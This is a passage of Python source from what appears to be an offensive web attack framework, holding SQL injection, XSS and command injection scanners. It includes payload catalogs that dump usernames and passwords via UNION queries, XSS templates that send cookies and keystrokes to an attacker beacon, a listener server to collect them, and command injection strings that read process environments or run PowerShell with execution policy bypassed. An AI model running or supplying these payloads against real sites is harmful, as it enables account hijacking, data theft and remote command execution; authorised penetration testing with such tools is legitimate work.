        self.semaphore.release()
        with self.lock:
            self.active_connections -= 1
    
    def get_active_count(self):
        """Get number of active connections"""
        with self.lock:
            return self.active_connections

class ErrorHandler:
    """Centralized error handling"""
    
    def __init__(self, logger):
        self.logger = logger
        self.error_counts = {}
        self.lock = threading.Lock()
    
    def handle_error(self, error, context="", fatal=False):
        """Handle error with logging and tracking"""
        error_type = type(error).__name__
        error_msg = str(error)
        
        # Track error frequency
        with self.lock:
            self.error_counts[error_type] = self.error_counts.get(error_type, 0) + 1
        
        # Log error
        log_msg = f"{context}: {error_type} - {error_msg}"
        self.logger.log(log_msg, "ERROR")
        
        # Display to user
        print(f"{Fore.RED}[!] Error: {error_msg}{Style.RESET_ALL}")
        if context:
            print(f"{Fore.YELLOW}[*] Context: {context}{Style.RESET_ALL}")
        
        # If fatal, provide recovery suggestions
        if fatal:
            print(f"{Fore.RED}[!] Fatal error - operation aborted{Style.RESET_ALL}")
            self.suggest_recovery(error_type)
    
    def suggest_recovery(self, error_type):
        """Suggest recovery actions"""
        suggestions = {
            'ConnectionError': 'Check network connectivity and target availability',
            'TimeoutError': 'Increase timeout value or check target responsiveness',
            'PermissionError': 'Check file permissions or run with appropriate privileges',
            'ValueError': 'Verify input parameters and format',
            'KeyError': 'Check configuration options are properly set'
        }
        
        if error_type in suggestions:
            print(f"{Fore.CYAN}[→] Suggestion: {suggestions[error_type]}{Style.RESET_ALL}")
    
    def get_error_stats(self):
        """Get error statistics"""
        with self.lock:
            return dict(self.error_counts)


@dataclass
class HTTPResponseMeta:
    """Lightweight representation of HTTP response characteristics"""
    status: int
    length: int
    elapsed: float
    snippet: str


@dataclass
class SQLiFinding:
    """Structured SQL injection finding"""
    parameter: str
    technique: str
    payload: str
    severity: str
    evidence: str
    response_time: float
    status_code: int
    vector: str
    dbms: Optional[str] = None
    confidence: float = 0.0


class SQLiPayloadGenerator:
    """Generate SQL injection payloads for multiple techniques"""

    def __init__(self):
        self.catalog = {
            'boolean': [
                "' OR '1'='1",
                "') OR ('1'='1",
                """" OR ""=""",
                "' OR 1=1--",
                "') OR 1=1--",
                "') OR ('a'='a"
            ],
            'error': [
                "' UNION SELECT 1/0--",
                "' UNION SELECT exp(999999999)--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT('~',@@version,'~',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' || (SELECT 1/0 FROM dual)--",
                "' OR updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--"
            ],
            'union': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT username,password FROM users--",
                "') UNION SELECT NULL,NULL--"
            ],
            'time': [
                "' OR SLEEP(5)--",
                "' WAITFOR DELAY '0:0:5'--",
                "';SELECT pg_sleep(5)--",
                "') OR SLEEP(5)--",
                """'; IF (1=1) WAITFOR DELAY '0:0:5'--"""
            ]
        }

    def generate(self, techniques, max_depth=3, max_payloads=80):
        plan = []
        for technique in techniques:
            payloads = list(self.catalog.get(technique, []))
            if technique == 'union':
                additional = [
                    "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
                    "' UNION SELECT table_name,NULL FROM information_schema.tables--"
                ]
                payloads.extend(additional[:max(0, max_depth - len(payloads))])
            for payload in payloads[:max_payloads]:
                plan.append({'technique': technique, 'payload': payload})
        return plan


class SQLiResponseAnalyzer:
    """Analyze differential HTTP responses for SQLi indicators"""

    ERROR_PATTERNS = [
        'you have an error in your sql syntax',
        'warning: mysql',
        'quoted string not properly terminated',
        'unclosed quotation mark',
        'mysql_fetch',
        'native client',
        'sqlstate',
        'ora-'
    ]

    DB_FINGERPRINTS = {
        'mysql': ['mysql', 'maria', 'innodb'],
        'postgresql': ['postgresql', 'pg_', 'pg-admin'],
        'mssql': ['microsoft sql', 'sql server', 'oledb'],
        'oracle': ['oracle', 'ora-'],
        'sqlite': ['sqlite']
    }

    def __init__(self, baseline_meta: HTTPResponseMeta, thresholds=None):
        self.baseline = baseline_meta
        self.thresholds = thresholds or {'length_delta': 120, 'time_delta': 3.0}

    def evaluate(self, parameter, technique, payload, response_meta: HTTPResponseMeta):
        findings = []
        evidence = None
        severity = 'Low'
        confidence = 0.0

        length_delta = abs(response_meta.length - self.baseline.length)
        time_delta = response_meta.elapsed - self.baseline.elapsed
        snippet_lower = response_meta.snippet.lower()

        if technique == 'boolean' and length_delta > self.thresholds['length_delta']:
            evidence = f'Response length delta {length_delta}'
            severity = 'Medium'
            confidence = min(1.0, length_delta / (self.baseline.length + 1))
        elif technique == 'time' and time_delta > self.thresholds['time_delta']:
            evidence = f'Response delayed by {time_delta:.2f}s'
            severity = 'High'
            confidence = min(1.0, time_delta / (self.thresholds['time_delta'] * 2))
        else:
            for pattern in self.ERROR_PATTERNS:
                if pattern in snippet_lower:
                    evidence = f"Error message: {pattern}"
                    severity = 'High'
                    confidence = 0.9
                    break

        if not evidence and technique == 'union' and 'select' in snippet_lower and length_delta > 40:
            evidence = 'Likely UNION result included in response'
            severity = 'High'
            confidence = 0.8

        if not evidence:
            return None

        detected_db = self._detect_db(snippet_lower)
        return SQLiFinding(
            parameter=parameter,
            technique=technique,
            payload=payload,
            severity=severity,
            evidence=evidence,
            response_time=response_meta.elapsed,
            status_code=response_meta.status,
            vector='query',
            dbms=detected_db,
            confidence=round(confidence, 2)
        )

    def _detect_db(self, snippet_lower):
        for dbms, tokens in self.DB_FINGERPRINTS.items():
            if any(token in snippet_lower for token in tokens):
                return dbms
        return None


class AdvancedSQLiScanner:
    """High-performance SQL injection scanner and exploitation helper"""

    def __init__(self, profile, framework=None):
        self.profile = profile
        self.framework = framework
        self.payload_factory = SQLiPayloadGenerator()
        self.findings: List[SQLiFinding] = []
        self.errors = []
        self.session = requests.Session()
        self.request_lock = threading.Lock()
        self.rate_limiter = getattr(framework, 'rate_limiter', None)
        self.logger = getattr(framework, 'logger', None)
        self.baseline_meta = None
        self.parameters = []
        self.base_url = ''
        self.base_params = {}
        self.base_body = {}
        self.method = 'GET'
        self.headers = {}
        self.cookies = {}
        self.proxies = None
        self.analyzer = None
        self.plan_size = 0

    def execute(self):
        if not self._prepare_environment():
            return
        baseline_response = self._perform_request(self.base_params, self.base_body)
        if not baseline_response:
            print(f"{Fore.RED}[!] Unable to obtain baseline response; aborting scan{Style.RESET_ALL}")
            return
        self.baseline_meta = baseline_response
        self.analyzer = SQLiResponseAnalyzer(self.baseline_meta, {
            'length_delta': self.profile['length_threshold'],
            'time_delta': self.profile['delay_threshold']
        })
        plan = self._build_plan()
        if not plan:
            print(f"{Fore.YELLOW}[!] No payload plan generated; adjust parameters or techniques{Style.RESET_ALL}")
            return
        print(f"{Fore.CYAN}[*] Testing {len(plan)} payloads across {len(self.parameters)} parameter(s){Style.RESET_ALL}")
        start_time = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.profile['threads']) as executor:
            futures = [executor.submit(self._execute_task, task) for task in plan]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if isinstance(result, SQLiFinding):
                    self.findings.append(result)
                elif isinstance(result, dict) and result.get('error'):
                    self.errors.append(result)
        duration = time.time() - start_time
        self._report(duration)

    def _prepare_environment(self):
        parsed = urlparse(self.profile['url'])
        if parsed.scheme not in {'http', 'https'}:
            print(f"{Fore.RED}[!] Invalid URL scheme for SQLi module{Style.RESET_ALL}")
            return False
        self.base_url = parsed._replace(query='', fragment='').geturl()
        self.base_params = dict(parse_qsl(parsed.query, keep_blank_values=True))
        body = self.profile['body'].strip()
        self.base_body = dict(parse_qsl(body, keep_blank_values=True)) if body else {}
        provided_params = self.profile['parameters']
        if provided_params == 'auto':
            self.parameters = list(self.base_params.keys()) or ['id']
        else:
            self.parameters = [p.strip() for p in provided_params.split(',') if p.strip()]
            if not self.parameters:
                self.parameters = ['id']
        requested_method = self.profile['method'].lower()
        if requested_method == 'auto':
            requested_method = 'post' if self.base_body else 'get'
        self.method = 'POST' if requested_method.lower() == 'post' else 'GET'
        self.headers = self.profile['headers']
        self.cookies = self.profile['cookies']
        self.proxies = self.profile['proxies']
        return True

    def _build_plan(self):
        techniques = [t.strip() for t in self.profile['techniques'] if t.strip()]
        payloads = self.payload_factory.generate(techniques, self.profile['max_depth'], self.profile['max_payloads'])
        plan = []
        for parameter in self.parameters:
            for payload_entry in payloads:
                plan.append({
                    'parameter': parameter,
                    'technique': payload_entry['technique'],
                    'payload': payload_entry['payload'],
                    'location': self.profile['injection_location']
                })
        self.plan_size = len(plan)
        return plan[: self.profile['max_total_payloads']]

    def _execute_task(self, task):
        response_meta = self._perform_request_with_payload(task['parameter'], task['payload'], task['location'])
        if not response_meta:
            return {'error': f"No response for {task['parameter']}"}
        finding = self.analyzer.evaluate(task['parameter'], task['technique'], task['payload'], response_meta)
        if finding:
            return finding
        return None

    def _perform_request_with_payload(self, parameter, payload, location):
        params = dict(self.base_params)
        data = dict(self.base_body)
        if location in {'query', 'both'} or (location == 'auto' and parameter in params):
            params[parameter] = payload
        else:
            data[parameter] = payload
        return self._perform_request(params, data)

    def _perform_request(self, params, data):
        if self.rate_limiter:
            self.rate_limiter.wait_if_needed()
        if self.profile['throttle']:
            time.sleep(self.profile['throttle'])
        req_kwargs = {
            'url': self.base_url,
            'params': params if self.method == 'GET' else None,
            'data': data if self.method == 'POST' else None,
            'headers': self.headers,
            'cookies': self.cookies,
            'timeout': self.profile['timeout'],
            'verify': self.profile['verify_ssl'],
            'proxies': self.proxies
        }
        start = time.perf_counter()
        try:
            response = requests.request(self.method, **req_kwargs)
            elapsed = time.perf_counter() - start
            snippet = response.text[:500] if response.text else ''
            return HTTPResponseMeta(
                status=response.status_code,
                length=len(response.content or b''),
                elapsed=elapsed,
                snippet=snippet
            )
        except Exception as exc:
            sanitized = str(exc).split('\n')[0][:200]
            self.errors.append({'error': sanitized})
            if self.logger:
                self.logger.log(f"SQLi request error: {sanitized}", 'WARNING')
            return None

    def _report(self, duration):
        self.findings.sort(key=lambda f: {'Critical': 0, 'High': 1, 'Medium': 2, 'Low': 3}.get(f.severity, 4))
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}SQL INJECTION SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Payloads tested : {Fore.CYAN}{min(self.plan_size, self.profile['max_total_payloads'])}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Findings : {Fore.GREEN}{len(self.findings)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Errors : {Fore.YELLOW}{len(self.errors)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Duration : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
        if self.findings:
            print(f"\n{Fore.GREEN}[+] Top Findings{Style.RESET_ALL}")
            for finding in self.findings[:5]:
                dbms = f" ({finding.dbms})" if finding.dbms else ''
                print(f" {Fore.YELLOW}{finding.severity:<8}{Style.RESET_ALL} {finding.parameter} via {finding.technique}{dbms} – {finding.evidence}")
        report_paths = self._export_results(duration)
        if report_paths:
            print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
            for path in report_paths:
                print(f" • {path}")

    def _export_results(self, duration):
        timestamp = int(time.time())
        host = urlparse(self.profile['url']).netloc.replace(':', '_') or 'target'
        base_name = f"sql_injection_{host}_{timestamp}"
        json_path = f"{base_name}.json"
        txt_path = f"{base_name}_report.txt"
        data = {
            'target': self.profile['url'],
            'timestamp': timestamp,
            'duration': duration,
            'payloads_planned': self.plan_size,
            'findings': [finding.__dict__ for finding in self.findings],
            'errors': self.errors[:20]
        }
        with open(json_path, 'w', encoding='utf-8') as fh:
            json.dump(data, fh, indent=2)
        with open(txt_path, 'w', encoding='utf-8') as fh:
            fh.write("=" * 78 + "\n")
            fh.write("SQL INJECTION REPORT - KNDYS FRAMEWORK\n")
            fh.write("=" * 78 + "\n\n")
            fh.write(f"Target: {self.profile['url']}\n")
            fh.write(f"Payloads Planned: {self.plan_size}\n")
            fh.write(f"Findings: {len(self.findings)}\n")
            fh.write(f"Duration: {duration:.2f}s\n\n")
            if self.findings:
                for finding in self.findings:
                    fh.write(f"[{finding.severity}] Param: {finding.parameter} | Technique: {finding.technique}\n")
                    fh.write(f"Evidence: {finding.evidence}\n")
                    fh.write(f"Payload: {finding.payload}\n")
                    fh.write(f"Confidence: {finding.confidence}\n\n")
            else:
                fh.write("No exploitable SQL injection indicators detected.\n\n")
            if self.errors:
                fh.write("Errors/Warnings:\n")
                for entry in self.errors[:10]:
                    fh.write(f"- {entry.get('error')}\n")
        return [json_path, txt_path]


@dataclass
class XSSPayload:
    """Describe a crafted XSS payload"""
    name: str
    payload: str
    context: str
    description: str
    tags: List[str]
    marker: str
    evasion: List[str]
    source: str = 'library'


@dataclass
class XSSFinding:
    """Record a verified XSS reflection"""
    parameter: str
    payload_name: str
    context: str
    evidence: str
    severity: str
    reflection_type: str
    payload: str
    marker: str
    response_code: int
    request_location: str


class XSSPayloadFactory:
    """Generate modern XSS payloads with contextual variants"""

    def __init__(self):
        self.library = {
            'stealth_cookie': {
                'template': "<script>fetch('[[BEACON]]?k='+document.cookie)</script>",
                'context': 'script',
                'description': 'Silent cookie exfiltration beacon',
                'tags': ['cookie', 'beacon'],
                'evasion': ['short']
            },
            'dom_keylogger': {
                'template': "<script>document.addEventListener('keypress',e=>fetch('[[BEACON]]?d='+encodeURIComponent(e.key)))</script>",
                'context': 'script',
                'description': 'Minimal DOM keylogger sending keystrokes to beacon',
                'tags': ['dom', 'keylogger'],
                'evasion': ['short']
            },
            'polyglot_img': {
                'template': "<svg/onload=fetch('[[BEACON]]?p={{MARK}}')>",
                'context': 'tag',
                'description': 'SVG onload polyglot for HTML/attribute contexts',
                'tags': ['polyglot'],
                'evasion': ['svg']
            },
            'iframe_autosubmit': {
                'template': "<iframe srcdoc=\"<script>fetch('[[BEACON]]?i={{MARK}}')</script>\"></iframe>",
                'context': 'html',
                'description': 'Iframe srcdoc payload for stored XSS testing',
                'tags': ['stored'],
                'evasion': ['iframe']
            },
            'attr_breakout': {
                'template': "\" onmouseover=fetch('[[BEACON]]?a={{MARK}}')//",
                'context': 'attribute',
                'description': 'Attribute breakout leveraging double quote injection',
                'tags': ['event', 'attribute'],
                'evasion': ['quote']
            },
            'style_injection': {
                'template': "</style><script>fetch('[[BEACON]]?s={{MARK}}')</script>",
                'context': 'html',
                'description': 'Break from style tag into executable script',
                'tags': ['html'],
                'evasion': ['style-break']
            },
            'event_handler': {
                'template': "<img src=x onerror=fetch('[[BEACON]]?e={{MARK}}')>",
                'context': 'event',
                'description': 'Classic image onerror beacon',
                'tags': ['reflected'],
                'evasion': ['img']
            }
        }
        self.profiles = {
            'stealth': ['stealth_cookie', 'attr_breakout'],
            'balanced': ['stealth_cookie', 'attr_breakout', 'polyglot_img', 'event_handler'],
            'aggressive': ['stealth_cookie', 'attr_breakout', 'polyglot_img', 'event_handler', 'dom_keylogger', 'iframe_autosubmit', 'style_injection']
        }

    def generate(self, profile_name, max_payloads, custom_payload, beacon_url):
        selected = self.profiles.get(profile_name, self.profiles['balanced'])
        payloads: List[XSSPayload] = []
        for key in selected:
            if key not in self.library:
                continue
            spec = self.library[key]
            marker = secrets.token_hex(4)
            vector = spec['template'].replace('{{MARK}}', marker)
            vector = vector.replace('[[BEACON]]', beacon_url or '')
            payloads.append(XSSPayload(
                name=key,
                payload=vector,
                context=spec['context'],
                description=spec['description'],
                tags=spec['tags'],
                marker=marker,
                evasion=spec['evasion']
            ))
        if custom_payload:
            marker = secrets.token_hex(4)
            vector = custom_payload.replace('{{MARK}}', marker)
            vector = vector.replace('[[BEACON]]', beacon_url or '')
            payloads.append(XSSPayload(
                name='custom',
                payload=vector,
                context='custom',
                description='Operator supplied payload',
                tags=['custom'],
                marker=marker,
                evasion=['custom'],
                source='custom'
            ))
        if max_payloads:
            payloads = payloads[:max_payloads]
        return payloads


class XSSPayloadEncoder:
    """Apply encoding strategies to payloads"""

    @staticmethod
    def apply(payload, mode):
        if mode == 'url':
            return quote(payload, safe='')
        if mode == 'double-url':
            return quote(quote(payload, safe=''), safe='')
        if mode == 'html':
            return payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#39;')
        return payload


class XSSAutoVerifier:
    """Automatically exercise payloads against a target and report reflections"""

    def __init__(self, profile, payloads, framework=None):
        self.profile = profile
        self.payloads = payloads
        self.framework = framework
        self.session = requests.Session()
        self.base_url = ''
        self.base_params = {}
        self.base_body = {}
        self.method = 'GET'
        self.parameters = []
        self.errors = []
        self.rate_limiter = profile.get('rate_limiter') or getattr(framework, 'rate_limiter', None)
        self.logger = getattr(framework, 'logger', None)
        self.timeout = profile['timeout']
        self.verify_ssl = profile['verify_ssl']
        self.headers = profile['headers']
        self.cookies = profile['cookies']
        self.proxies = profile['proxies']
        self.injection_location = profile['injection_location']
        self.throttle = profile['throttle']
        self.analysis_window = 4096

    def execute(self):
        if not self._prepare_environment():
            return {'findings': [], 'errors': self.errors, 'requests': 0, 'duration': 0.0}
        plan = self._build_plan()
        if not plan:
            return {'findings': [], 'errors': self.errors, 'requests': 0, 'duration': 0.0}
        findings: List[XSSFinding] = []
        start = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.profile['threads']) as executor:
            futures = [executor.submit(self._probe, task) for task in plan]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if isinstance(result, XSSFinding):
                    findings.append(result)
                elif isinstance(result, dict) and result.get('error'):
                    self.errors.append(result)
        duration = time.time() - start
        return {'findings': findings, 'errors': self.errors, 'requests': len(plan), 'duration': duration}

    def _prepare_environment(self):
        parsed = urlparse(self.profile['url'])
        if parsed.scheme not in {'http', 'https'}:
            self.errors.append({'error': 'Invalid URL scheme'})
            return False
        self.base_url = parsed._replace(query='', fragment='').geturl()
        self.base_params = dict(parse_qsl(parsed.query or '', keep_blank_values=True))
        self.base_body = dict(parse_qsl(self.profile['body'], keep_blank_values=True)) if self.profile['body'] else {}
        requested_method = self.profile['method'].lower()
        if requested_method == 'auto':
            requested_method = 'post' if self.base_body else 'get'
        self.method = 'POST' if requested_method == 'post' else 'GET'
        parameters_raw = self.profile['parameters']
        if parameters_raw == 'auto':
            candidates = list(self.base_params.keys()) + list(self.base_body.keys())
            self.parameters = candidates or ['q']
        else:
            self.parameters = [p.strip() for p in parameters_raw.split(',') if p.strip()]
            if not self.parameters:
                self.parameters = ['q']
        return True

    def _build_plan(self):
        plan = []
        total_limit = self.profile['max_payloads'] or len(self.payloads)
        payloads = self.payloads[:total_limit]
        for parameter in self.parameters:
            for payload in payloads:
                plan.append({'parameter': parameter, 'payload': payload})
        plan = plan[:self.profile['max_total_payloads']]
        return plan

    def _probe(self, task):
        payload = task['payload']
        encoded_payload = XSSPayloadEncoder.apply(payload.payload, self.profile['encoder'])
        params = dict(self.base_params)
        data = dict(self.base_body)
        location = self.injection_location
        target_param = task['parameter']
        if location in {'query', 'both'} or (location == 'auto' and (target_param in params or self.method == 'GET')):
            params[target_param] = encoded_payload
        else:
            data[target_param] = encoded_payload
        if self.rate_limiter:
            self.rate_limiter.wait_if_needed()
        if self.throttle:
            time.sleep(self.throttle)
        try:
            response = self.session.request(
                self.method,
                self.base_url,
                params=params if self.method == 'GET' else None,
                data=data if self.method == 'POST' else None,
                headers=self.headers,
                cookies=self.cookies,
                timeout=self.timeout,
                verify=self.verify_ssl,
                proxies=self.proxies,
                allow_redirects=True
            )
        except Exception as exc:
            sanitized = str(exc).split('\n')[0][:200]
            if self.logger:
                self.logger.log(f"XSS verifier error: {sanitized}", 'WARNING')
            return {'error': sanitized}
        evidence = self._analyze_response(payload, response)
        if evidence:
            return XSSFinding(
                parameter=task['parameter'],
                payload_name=payload.name,
                context=payload.context,
                evidence=evidence['snippet'],
                severity=evidence['severity'],
                reflection_type=evidence['reflection'],
                payload=payload.payload,
                marker=payload.marker,
                response_code=response.status_code,
                request_location='query' if target_param in params else 'body'
            )
        return None

    def _analyze_response(self, payload, response):
        snippet = (response.text or '')[:self.analysis_window]
        marker_lower = payload.marker.lower()
        snippet_lower = snippet.lower()
        if marker_lower in snippet_lower:
            idx = snippet_lower.index(marker_lower)
            window_start = max(0, idx - 60)
            window_end = min(len(snippet), idx + 60)
            window = snippet[window_start:window_end]
            reflection = self._classify_reflection(window)
            severity = self._severity_from_context(payload.context, reflection)
            return {'snippet': window.strip(), 'reflection': reflection, 'severity': severity}
        return None

    def _classify_reflection(self, snippet):
        if '<script' in snippet.lower():
            return 'script'
        if 'onerror' in snippet.lower() or 'onload' in snippet.lower():
            return 'event'
        if '&#' in snippet or '&lt;' in snippet.lower():
            return 'encoded'
        if '>' in snippet:
            return 'html'
        return 'text'

    def _severity_from_context(self, context, reflection):
        if context in {'script', 'dom'} or reflection in {'script', 'event'}:
            return 'High'
        if reflection == 'html':
            return 'Medium'
        return 'Low'


class XSSBeaconHandler(BaseHTTPRequestHandler):
    """Minimal HTTP handler to capture XSS beacons"""

    def do_GET(self):
        self._record_event()

    def do_POST(self):
        self._record_event()

    def log_message(self, format, *args):
        return # Silence default logging

    def _record_event(self):
        parsed = urlparse(self.path)
        params = dict(parse_qsl(parsed.query, keep_blank_values=True))
        token = params.get('token', '')
        if self.server.expected_token and token != self.server.expected_token:
            self.send_response(403)
            self.end_headers()
            return
        entry = {
            'path': parsed.path,
            'query': params,
            'timestamp': time.time(),
            'source': self.client_address[0]
        }
        self.server.events.append(entry)
        self.send_response(204)
        self.end_headers()


class ThreadedBeaconHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


class XSSBeaconServer:
    """Wrapper to manage background beacon listener"""

    def __init__(self, host, port, token='', logger=None):
        self.host = host
        self.port = port
        self.token = token
        self.logger = logger
        self.server = None
        self.thread = None
        self.events = []

    def start(self):
        try:
            handler = self._build_handler()
            self.server = ThreadedBeaconHTTPServer((self.host, self.port), handler)
            self.server.events = self.events
            self.server.expected_token = self.token
            self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.thread.start()
            if self.logger:
                self.logger.log(f"XSS beacon listener started on {self.host}:{self.port}", 'INFO')
            return True
        except Exception as exc:
            if self.logger:
                self.logger.log(f"Beacon listener failed: {exc}", 'ERROR')
            return False

    def stop(self):
        if self.server:
            try:
                self.server.shutdown()
                self.server.server_close()
            except Exception:
                pass
        if self.thread:
            self.thread.join(timeout=1)

    def _build_handler(self):
        token = self.token

        class BoundHandler(XSSBeaconHandler):
            pass

        return BoundHandler


@dataclass
class CommandInjectionPayload:
    """Container for command injection payload metadata"""
    name: str
    payload: str
    category: str
    os: str
    marker: str
    command: str
    description: str


@dataclass
class CommandInjectionFinding:
    """Result of a successful command injection probe"""
    parameter: str
    payload_name: str
    os: str
    evidence: str
    severity: str
    indicator: str
    elapsed: float
    status_code: int
    payload: str
    marker: str
    location: str


class CommandPayloadEncoder:
    """Encoding helpers for command injection payloads"""

    @staticmethod
    def apply(payload, mode):
        if mode == 'url':
            return quote(payload, safe='')
        if mode == 'double-url':
            return quote(quote(payload, safe=''), safe='')
        if mode == 'base64':
            return base64.b64encode(payload.encode()).decode()
        return payload


class CommandInjectionPayloadFactory:
    """Generate contextual command injection payloads"""

    def __init__(self):
        self.library = {
            'linux': [
                {
                    'name': 'semicolon_echo',
                    'template': ";echo {{MARK}};{{CMD}}",
                    'category': 'detect',
                    'description': 'Simple semicolon command separator'
                },
                {
                    'name': 'pipe_id',
                    'template': "|id;echo {{MARK}}",
                    'category': 'detect',
                    'description': 'Pipe into id command'
                },
                {
                    'name': 'subshell_whoami',
                    'template': "`{{CMD}};echo {{MARK}}`",
                    'category': 'detect',
                    'description': 'Backtick subshell execution'
                },
                {
                    'name': 'logical_and',
                    'template': "&& {{CMD}} && echo {{MARK}}",
                    'category': 'detect',
                    'description': 'Logical AND execution'
                },
                {
                    'name': 'blind_sleep',
                    'template': ";sleep {{DELAY}};echo {{MARK}}",
                    'category': 'blind',
                    'description': 'Time-based payload'
                },
                {
                    'name': 'env_leak',
                    'template': ";cat /proc/self/environ|head -n 1;echo {{MARK}}",
                    'category': 'enumeration',
                    'description': 'Environment leak'
                }
            ],
            'windows': [
                {
                    'name': 'ampersand_echo',
                    'template': "& echo {{MARK}} & {{CMD}}",
                    'category': 'detect',
                    'description': 'Ampersand separator'
                },
                {
                    'name': 'pipe_whoami',
                    'template': "| whoami & echo {{MARK}}",
                    'category': 'detect',
                    'description': 'Pipe whoami result'
                },
                {
                    'name': 'double_pipe',
                    'template': "|| {{CMD}} && echo {{MARK}}",
                    'category': 'detect',
                    'description': 'OR execution'
                },
                {
                    'name': 'blind_timeout',
                    'template': "& timeout /T {{DELAY}} & echo {{MARK}}",
                    'category': 'blind',
                    'description': 'Time-based payload'
                },
                {
                    'name': 'powershell_inline',
                    'template': "& powershell -NoP -NonI -ExecutionPolicy Bypass -Command \"{{CMD}};Write-Output '{{MARK}}'\"",
                    'category': 'detect',
                    'description': 'Inline PowerShell execution'
                }
            ]
        }

    def generate(self, os_profile, attack_modes, custom_payload, confirm_command, delay):
        os_payloads = self.library.get(os_profile, self.library['linux'])
        payloads = []
        for spec in os_payloads:
            if spec['category'] not in attack_modes:
                continue
            marker = secrets.token_hex(4)
            payload_text = spec['template']
            payload_text = payload_text.replace('{{MARK}}', marker)
            payload_text = payload_text.replace('{{CMD}}', confirm_command)
            payload_text = payload_text.replace('{{DELAY}}', str(delay))
            payloads.append(CommandInjectionPayload(
                name=spec['name'],
                payload=payload_text,
                category=spec['category'],
                os=os_profile,
                marker=marker,
                command=confirm_command,
                description=spec['description']
            ))
        if custom_payload:
            marker = secrets.token_hex(4)
            payload_text = custom_payload.replace('{{MARK}}', marker)
            payloads.append(CommandInjectionPayload(
                name='custom',
                payload=payload_text,
                category='custom',
                os=os_profile,
                marker=marker,
                command=confirm_command,
                description='Operator supplied payload'
            ))
        return payloads


class CommandInjectionResponseAnalyzer:
    """Determine whether a response indicates successful command execution"""

    def __init__(self, indicators, success_regex, blind_delay):
        self.indicators = [indicator.lower() for indicator in indicators if indicator]
        self.success_regex = re.compile(success_regex, re.IGNORECASE) if success_regex else None
        self.blind_delay = blind_delay

    def evaluate(self, payload, response_meta: HTTPResponseMeta):
        snippet = response_meta.snippet or ''
        snippet_lower = snippet.lower()
        if payload.marker and payload.marker.lower() in snippet_lower:
            return {
                'indicator': 'marker',
                'severity': 'Critical',
                'evidence': self._window(snippet, payload.marker)
            }
        for indicator in self.indicators:
            if indicator and indicator in snippet_lower:
                return {
                    'indicator': indicator,
                    'severity': 'High',
                    'evidence': self._window(snippet, indicator)
                }
        if self.success_regex and self.success_regex.search(snippet):
            match = self.success_regex.search(snippet)
            return {
                'indicator': match.group(0),
                'severity': 'Medium',
                'evidence': self._window(snippet, match.group(0))
            }
        if payload.category == 'blind' and response_meta.elapsed >= max(1.5, self.blind_delay - 1):
            return {
                'indicator': 'time-delay',
                'severity': 'Medium',
                'evidence': f"Observed {response_meta.elapsed:.2f}s response delay"
            }
        return None

    def _window(self, text, token):
        token_lower = token.lower()
        lower = text.lower()
        idx = lower.find(token_lower)
        if idx == -1:
            return text[:120]
        start = max(0, idx - 60)
        end = min(len(text), idx + 60)
        return text[start:end]


class AdvancedCommandInjectionScanner:
    """Concurrent command injection detection engine"""

    def __init__(self, profile, framework=None):
        self.profile = profile
        self.framework = framework
        self.payload_factory = CommandInjectionPayloadFactory()
        self.session = requests.Session()
        self.logger = getattr(framework, 'logger', None)
        self.rate_limiter = profile.get('rate_limiter') or getattr(framework, 'rate_limiter', None)
        self.parameters = []
        self.base_url = ''
        self.base_params = {}
        self.base_body = {}
        self.method = 'GET'
        self.plan_size = 0
        self.errors = []
        self.analyzer = CommandInjectionResponseAnalyzer(profile['indicators'], profile['success_regex'], profile['blind_delay'])
        self.payload_cache = []

    def execute(self):
        if not self._prepare_environment():
            return {'findings': [], 'errors': self.errors, 'requests': 0, 'duration': 0.0, 'parameters': self.parameters}
        payloads = self.payload_factory.generate(
            self.profile['os_profile'],
            self.profile['attack_modes'],
            self.profile['custom_payload'],
            self.profile['confirm_command'],
            self.profile['blind_delay']
        )
        if not payloads:
            self.errors.append({'error': 'No payloads generated'})
            return {'findings': [], 'errors': self.errors, 'requests': 0, 'duration': 0.0, 'parameters': self.parameters}
        self.payload_cache = payloads
        plan = self._build_plan(payloads)
        if not plan:
            self.errors.append({'error': 'Empty execution plan'})
            return {'findings': [], 'errors': self.errors, 'requests': 0, 'duration': 0.0, 'parameters': self.parameters}
        findings = []
        start = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.profile['threads']) as executor:
            futures = [executor.submit(self._execute_task, task) for task in plan]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if isinstance(result, CommandInjectionFinding):
                    findings.append(result)
                elif isinstance(result, dict) and result.get('error'):
                    self.errors.append(result)
        duration = time.time() - start
        return {'findings': findings, 'errors': self.errors, 'requests': len(plan), 'duration': duration, 'parameters': self.parameters}

    def _prepare_environment(self):
        parsed = urlparse(self.profile['url'])
        if parsed.scheme not in {'http', 'https'}:
            self.errors.append({'error': 'Invalid URL scheme'})
            return False
        self.base_url = parsed._replace(query='', fragment='').geturl()
        self.base_params = dict(parse_qsl(parsed.query or '', keep_blank_values=True))
        self.base_body = dict(parse_qsl(self.profile['body'], keep_blank_values=True)) if self.profile['body'] else {}
        parameters_raw = self.profile['parameters']
        if parameters_raw == 'auto':
            candidates = list(self.base_params.keys()) + list(self.base_body.keys())
            self.parameters = candidates or ['cmd']
        else:
